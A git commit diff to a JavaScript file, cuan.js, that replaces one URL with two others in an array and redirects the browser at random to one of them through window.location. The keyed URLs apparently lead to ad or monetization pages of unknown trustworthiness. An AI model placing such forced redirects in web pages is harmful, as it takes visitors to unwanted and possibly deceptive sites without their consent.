4caef2e7e66ed1963d014fbde45ba9d330990e16
itsmeplayfj <94605694+itsmeplayfj@users.noreply.github.com>
2022-01-13 12:30:46 -0600

    Update cuan.js

--- cuan.js
+++ cuan.js
@@ -1,5 +1,6 @@
 var dataUrl = [
-'https://anomalousporch.com/e5ntk4vw2?key=afc46c163b5e7aa15937edf1b69b82cc',
+'https://scammereating.com/sak2q36acm?key=6ed8eb6671883f3fef32e7207e19388f',
+'https://scammereating.com/h8ad994p3g?key=68c6e7dbd635523b65529770d75dbac1'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
